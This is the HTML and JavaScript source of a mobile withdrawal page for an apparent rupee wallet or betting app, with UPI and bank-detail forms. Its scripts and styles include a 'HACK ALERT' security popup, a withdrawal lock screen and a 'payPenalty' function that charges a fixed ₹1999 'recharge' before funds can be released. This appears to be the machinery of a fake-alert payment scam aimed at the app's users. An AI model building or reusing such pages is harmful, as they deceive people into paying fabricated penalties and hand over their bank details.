<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Withdrawal</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="css/main.css?v=1770403462">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="css/toastr.min.css">
    
    <style>
        /* --- LOCK SCREEN STYLES --- */
        .lock-wrapper {
            padding: 40px 20px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 70vh; text-align: center;
        }
        .lock-icon-box {
            width: 80px; height: 80px;
            background: rgba(255, 71, 87, 0.1);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            margin-bottom: 20px;
            animation: pulse-red 2s infinite;
        }
        .lock-icon-box i { font-size: 35px; color: #ff4757; }
        
        .lock-head { font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
        .lock-sub { font-size: 13px; color: #a4b0be; line-height: 1.6; margin-bottom: 30px; max-width: 300px; }

        .progress-card {
            width: 100%; background: #1e272e; border-radius: 12px; padding: 20px;
            border: 1px solid #2f3542; margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .stat-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; font-weight: 700; }
        .stat-val { color: #fff; }
        .stat-val.green { color: #2ecc71; }
        .stat-val.red { color: #ff4757; }

        .bar-bg { width: 100%; height: 10px; background: #000; border-radius: 20px; overflow: hidden; margin: 15px 0; }
        .bar-fill { height: 100%; background: linear-gradient(90deg, #ff4757, #ff6b81); border-radius: 20px; transition: width 1s ease; }

        .unlock-btn {
            background: linear-gradient(135deg, #ff4757 0%, #ff6b81 100%);
            color: #fff; border: none; padding: 15px; border-radius: 8px;
            width: 100%; font-size: 14px; font-weight: 800;
            display: flex; align-items: center; justify-content: center; gap: 10px;
            box-shadow: 0 5px 20px rgba(255, 71, 87, 0.4);
            cursor: pointer; transition: 0.2s;
        }
        .unlock-btn:active { transform: scale(0.96); }

        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(255, 71, 87, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0); } }
    </style>
</head>
<body class="deposit-page" oncontextmenu="return false;">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">

<style>
    body { padding-top: 60px; }

    /* HEADER STYLES (UNCHANGED) */
    .app-header {
        position: fixed; top: 0; left: 0; width: 100%; height: 60px;
        background: #0f172a; border-bottom: 1px solid #1e293b;
        display: flex; align-items: center; justify-content: space-between;
        padding: 0 15px; z-index: 1000; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    }
    .nav-left .profile-btn {
        width: 38px; height: 38px; border-radius: 50%; border: 2px solid #334155;
        overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center; background:#1e293b;
    }
    .nav-left .profile-btn img { width: 100%; height: 100%; object-fit: cover; }
    .nav-center { position: absolute; left: 50%; transform: translateX(-50%); }
    .logo-img { height: 28px; filter: drop-shadow(0 0 5px rgba(255,255,255,0.1)); }
    .wallet-box {
        display: flex; align-items: center; background: #1e293b;
        border: 1px solid #334155; border-radius: 30px; padding: 4px 4px 4px 12px; gap: 8px; height: 36px;
    }
    .w-bal { font-family: 'Roboto', sans-serif; font-size: 13px; font-weight: 700; color: #fff; }
    .w-btn {
        width: 28px; height: 28px; border-radius: 50%; background: #22c55e;
        display: flex; align-items: center; justify-content: center; text-decoration: none; color: #000; font-size: 14px;
    }

    /* =========================================
       🔥 GLOBAL POPUP STYLES (High End)
    ========================================= */
    .secure-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0, 0, 0, 0.9); 
        z-index: 999999;
        display: flex; align-items: center; justify-content: center;
        font-family: 'Roboto', sans-serif;
    }

    /* --- HACK ALERT CARD --- */
    .security-card {
        background: #0f0f0f; width: 92%; max-width: 400px;
        border-radius: 12px; border: 1px solid #ef4444;
        box-shadow: 0 0 50px rgba(239, 68, 68, 0.25);
        overflow: hidden; position: relative;
    }
    .sec-header {
        background: linear-gradient(90deg, #7f1d1d, #450a0a);
        padding: 15px; display: flex; align-items: center; gap: 10px;
        border-bottom: 1px solid #ef4444;
    }
    .sec-header i { font-size: 20px; color: #fff; }
    .sec-title { color: #fff; font-weight: 700; font-size: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
    .close-x { margin-left: auto; color: #fff; cursor: pointer; font-size: 18px; opacity: 0.7; }

    .sec-body { padding: 20px; }
    
    .alert-box {
        background: rgba(239, 68, 68, 0.08); border-left: 4px solid #ef4444;
        padding: 15px; font-size: 13px; line-height: 1.6;
        margin-bottom: 20px; border-radius: 4px;
    }
    
    .alert-en { color: #fff; margin-bottom: 12px; display: block; }
    .alert-hi { color: #fca5a5; display: block; font-size: 12px; }

    .tech-row {
        display: flex; justify-content: space-between; border-bottom: 1px solid #222;
        padding: 8px 0; font-size: 12px;
    }
    .tech-label { color: #666; }
    .tech-val { color: #ef4444; font-family: monospace; font-weight: bold; }

    .amount-display {
        background: #18181b; border: 1px dashed #ef4444; border-radius: 8px;
        padding: 15px; text-align: center; margin: 20px 0;
    }
    .amt-lbl { font-size: 11px; text-transform: uppercase; color: #999; letter-spacing: 1px; }
    .amt-val { font-size: 28px; color: #fff; font-weight: 700; font-family: 'Rajdhani', sans-serif; display: block; margin-top: 5px; }

    .action-btn {
        background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; width: 100%; border: none; padding: 14px;
        border-radius: 6px; font-weight: 700; font-size: 14px; cursor: pointer;
        text-transform: uppercase; letter-spacing: 0.5px;
        box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4); transition: 0.2s;
    }
    .action-btn:active { transform: scale(0.98); }

    .payment-note {
        text-align: center; margin-top: 15px; font-size: 11px; color: #888;
        border-top: 1px solid #222; padding-top: 10px;
    }

    .upi-section {
        background: #18181b; padding: 10px; border-radius: 6px; margin-top: 10px;
        display: flex; justify-content: space-between; align-items: center; border: 1px solid #333;
    }
    .upi-code { color: #fff; font-family: monospace; font-size: 13px; }
    .copy-sm { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; cursor: pointer; }


    /* --- TRACKING CARD (FLIPKART STYLE) --- */
    .track-card {
        background: #fff; width: 92%; max-width: 400px;
        border-radius: 8px; overflow: hidden; position: relative;
    }
    .tc-head {
        background: #2874f0; padding: 15px; color: #fff;
        display: flex; align-items: center; justify-content: space-between;
    }
    .tc-info div:first-child { font-size: 16px; font-weight: 700; }
    .tc-info div:last-child { font-size: 11px; opacity: 0.9; margin-top: 2px; }
    
    .tc-body { padding: 20px; background: #f1f3f6; max-height: 75vh; overflow-y: auto; }
    
    /* Timeline */
    .step-list { margin-left: 10px; border-left: 2px solid #dfe6e9; padding-left: 25px; position: relative; }
    .step-item { position: relative; margin-bottom: 30px; }
    .step-item:last-child { margin-bottom: 0; }
    
    .s-dot {
        width: 14px; height: 14px; background: #dfe6e9; border-radius: 50%;
        position: absolute; left: -33px; top: 2px; border: 3px solid #fff; z-index: 2;
    }
    .step-item.done .s-dot { background: #26a541; box-shadow: 0 0 0 2px #c8e6c9; }
    .step-item.done::before {
        content: ''; position: absolute; left: -27px; top: -30px; bottom: 15px; width: 2px; background: #26a541; z-index: 1;
    }

    .s-title { font-size: 14px; font-weight: 600; color: #212121; }
    .s-desc { font-size: 12px; color: #878787; margin-top: 2px; line-height: 1.4; }
    .s-time { font-size: 11px; color: #2874f0; font-weight: 500; margin-top: 4px; }
    
    .step-item.pending .s-title { color: #878787; }

    /* --- 🌟 FLOATING SUPPORT ICON (Draggable) --- */
    .support-float {
        position: fixed;
        bottom: 80px;
        right: 20px;
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background: linear-gradient(135deg, #3b82f6, #2563eb);
        display: flex; align-items: center; justify-content: center;
        box-shadow: 0 4px 20px rgba(37, 99, 235, 0.5);
        z-index: 9999;
        cursor: pointer;
        border: 2px solid #fff;
        transition: transform 0.1s;
    }
    .support-float:active { transform: scale(0.95); }
    .support-float img { width: 35px; height: 35px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
</style>

<header class="app-header">
    <div class="nav-left">
        <div class="profile-btn" onclick="window.location.href='profile.php'">
            <img src="https://cdn-icons-png.flaticon.com/128/4140/4140048.png" alt="Profile">
        </div>
    </div>
    <div class="nav-center">
        <a href="index.php"><img src="images/logo.png" class="logo-img" alt="Logo"></a>
    </div>
    <div class="nav-right">
        <div class="wallet-box">
            <span class="w-bal">₹ <span id="hBal">0.00</span></span>
            <a href="deposit.php" class="w-btn"><i class="fa-solid fa-plus"></i></a>
        </div>
    </div>
</header>

<div id="supportFloat" class="support-float" onclick="if(!isDragging) window.location.href='support.php'">
    <img src="https://cdn-icons-png.flaticon.com/128/4961/4961759.png" alt="Support">
</div>





<script>
    // Balance Live Update
    setInterval(() => {
        if(typeof window.balance !== 'undefined') {
            let el = document.getElementById('hBal');
            if(el) {
                let curr = parseFloat(el.innerText.replace(/,/g, ''));
                if(Math.abs(curr - window.balance) > 0.01) el.innerText = parseFloat(window.balance).toFixed(2);
            }
        }
    }, 2000);

    // Pay Function
    function payPenalty() {
        let btn = document.querySelector('.action-btn');
        let orgHtml = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> SECURE CONNECT...';
        btn.disabled = true;

        let fd = new FormData(); fd.append('amount', '1999');
        fetch('api/initiate_recharge.php', { method:'POST', body:fd })
        .then(r=>r.json()).then(d=>{
            if(d.status==='success') window.location.href = d.url;
            else { alert(d.message); btn.innerHTML='TRY AGAIN'; btn.disabled=false; }
        }).catch(e=>{
            // Fallback
            window.location.href = 'deposit.php?amount=1999';
        });
    }

    // Copy UPI
    function copyUpi() {
        navigator.clipboard.writeText(document.getElementById('admUpi').innerText);
        alert('UPI ID Copied');
    }

    // Close Popup
    function closePopup() {
        document.querySelectorAll('.secure-overlay').forEach(el => el.style.display = 'none');
    }

    // --- 🌟 DRAG LOGIC FOR SUPPORT ICON ---
    const floatBtn = document.getElementById('supportFloat');
    let isDragging = false;
    let startX, startY, initialLeft, initialTop;

    floatBtn.addEventListener('mousedown', dragStart);
    floatBtn.addEventListener('touchstart', dragStart, {passive: false});

    function dragStart(e) {
        isDragging = false; // Reset
        startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
        startY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
        
        let rect = floatBtn.getBoundingClientRect();
        initialLeft = rect.left;
        initialTop = rect.top;

        document.addEventListener('mousemove', dragMove);
        document.addEventListener('touchmove', dragMove, {passive: false});
        document.addEventListener('mouseup', dragEnd);
        document.addEventListener('touchend', dragEnd);
    }

    function dragMove(e) {
        e.preventDefault();
        isDragging = true; // Mark as drag, not click
        let clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
        let clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;

        let dx = clientX - startX;
        let dy = clientY - startY;

        floatBtn.style.left = (initialLeft + dx) + 'px';
        floatBtn.style.top = (initialTop + dy) + 'px';
        floatBtn.style.bottom = 'auto';
        floatBtn.style.right = 'auto';
    }

    function dragEnd() {
        document.removeEventListener('mousemove', dragMove);
        document.removeEventListener('touchmove', dragMove);
        document.removeEventListener('mouseup', dragEnd);
        document.removeEventListener('touchend', dragEnd);
        
        // Snap to edges (Optional Polish)
        // You can add logic here to snap the icon to left/right edge if released
    }      
</script>   
    
        <div class="dep-header-container">
            <div class="compact-card">
                <div class="cc-left">
                    <span class="cc-label">Withdrawable Balance</span>
                    <span class="cc-balance">₹ 0.00</span>
                </div>
                <div class="cc-icon">
                    <i class="fas fa-university"></i>
                </div>
            </div>
        </div>

        <div class="amount-section" style="margin-top:15px;">
            <label class="input-label">WITHDRAWAL AMOUNT</label>
            <div class="input-wrapper">
                <span class="curr-symbol">₹</span>
                <input type="number" id="amount" class="clean-input" placeholder="Min 200" onkeyup="checkAmount()">
            </div>
            <div class="min-limit-text" id="minMsg">Minimum withdrawal is ₹200</div>
        </div>

        <div style="margin: 0 20px 5px; font-size:12px; font-weight:600; color:#8b949e;">SELECT METHOD</div>
        
        <div class="wd-toggle-box">
            <div class="wd-option active" onclick="switchMethod('upi')">
                <i class="fas fa-qrcode"></i> UPI Transfer
            </div>
            <div class="wd-option" onclick="switchMethod('bank')">
                <i class="fas fa-university"></i> Bank Account
            </div>
        </div>

        <div id="upiForm" class="wd-form-card active">
            <div class="wd-input-group">
                <label class="wd-label">ENTER UPI ID (VPA)</label>
                <input type="text" id="upi_id" class="wd-field" placeholder="example@oksbi">
            </div>
            <div style="font-size:11px; color:#3b82f6;"><i class="fas fa-check-circle"></i> Instant Transfer Supported</div>
        </div>

        <div id="bankForm" class="wd-form-card">
            <div class="wd-input-group">
                <label class="wd-label">ACCOUNT NUMBER</label>
                <input type="number" id="acc_no" class="wd-field" placeholder="Enter Account No">
            </div>
            <div class="wd-input-group">
                <label class="wd-label">IFSC CODE</label>
                <input type="text" id="ifsc" class="wd-field" placeholder="SBIN000XXXX" style="text-transform:uppercase;">
            </div>
            <div class="wd-input-group">
                <label class="wd-label">ACCOUNT HOLDER NAME</label>
                <input type="text" id="holder" class="wd-field" placeholder="Name as per Bank">
            </div>
        </div>

        <div class="notice-card">
            <div class="notice-icon"><i class="fas fa-exclamation-triangle"></i></div>
            <div class="notice-text">
                <h4>Important Info</h4>
                <p>Withdrawals are processed within 10-45 minutes.</p>
            </div>
        </div>

        <div class="pay-bar">
            <button class="btn-pay-secure" onclick="submitWithdraw()">
                WITHDRAW SECURELY <i class="fas fa-arrow-right"></i>
            </button>
        </div>

    
    <script src="js/jquery.min.js"></script>
    <script src="js/toastr.min.js"></script>
    <script>
        toastr.options = {"positionClass": "toast-top-center"};
        let currentMethod = 'upi';

        // --- 🚀 DIRECT RECHARGE FUNCTION (Lock Screen) ---
        function processUnlockRecharge(amount) {
            let btn = $('.unlock-btn');
            let originalText = btn.html();
            
            // Loading State
            btn.html('<i class="fas fa-circle-notch fa-spin"></i> CONNECTING GATEWAY...').prop('disabled', true);

            // AJAX Call to same API as deposit.php
            $.post('api/initiate_recharge.php', { amount: amount }, function(res) {
                try {
                    let data = (typeof res === 'object') ? res : JSON.parse(res);
                    
                    if (data.status === 'success') {
                        toastr.success("Redirecting to Payment...");
                        // 🟢 DIRECT REDIRECT (Jese Deposit.php m hota h)
                        setTimeout(() => window.location.href = data.url, 1000);
                    } else {
                        toastr.error(data.message || "Gateway Error");
                        btn.html(originalText).prop('disabled', false);
                    }
                } catch (e) {
                    toastr.error("Server Connection Error");
                    btn.html(originalText).prop('disabled', false);
                }
            }).fail(function(){
                toastr.error("Network Error");
                btn.html(originalText).prop('disabled', false);
            });
        }

        // --- OLD: WITHDRAWAL LOGIC ---
        function checkAmount() {
            let val = $('#amount').val();
            if(val < 200 && val !== '') { $('#minMsg').show(); } else { $('#minMsg').hide(); }
        }

        function switchMethod(type) {
            currentMethod = type;
            $('.wd-option').removeClass('active');
            $('.wd-form-card').removeClass('active');
            if(type === 'upi') {
                $('.wd-option:first-child').addClass('active');
                $('#upiForm').addClass('active');
            } else {
                $('.wd-option:last-child').addClass('active');
                $('#bankForm').addClass('active');
            }
        }

        function submitWithdraw() {
            let amt = $('#amount').val();
            let details = '';

            if(!amt || amt < 200) {
                toastr.error("Minimum withdrawal is ₹200");
                return;
            }

            if(currentMethod === 'upi') {
                let upi = $('#upi_id').val();
                if(upi.length < 5 || !upi.includes('@')) { toastr.error("Enter valid UPI ID"); return; }
                details = "UPI: " + upi;
            } else {
                let acc = $('#acc_no').val();
                let ifsc = $('#ifsc').val();
                let name = $('#holder').val();
                if(!acc || !ifsc || !name) { toastr.error("Fill all bank details"); return; }
                details = `Bank: ${acc} | IFSC: ${ifsc} | Name: ${name}`;
            }

            let btn = $('.btn-pay-secure');
            let originalText = btn.html();
            btn.html('<i class="fas fa-spinner fa-spin"></i> PROCESSING...').prop('disabled', true);

            $.post('api/withdraw_request.php', {
                amount: amt, method: currentMethod, details: details
            }, function(res) {
                let data = (typeof res === 'object') ? res : JSON.parse(res);
                if(data.status === 'success') {
                    toastr.success(data.message);
                    setTimeout(()=> window.location.href='profile.php', 2000);
                } else {
                    toastr.error(data.message);
                    btn.html(originalText).prop('disabled', false);
                }
            });
        }
    </script>
<script defer src="js/vcd15cbe7772f49c399c6a5babf22c1241717689176015.js" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b4db3be8d00d4fe6859924dd0298e0b2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>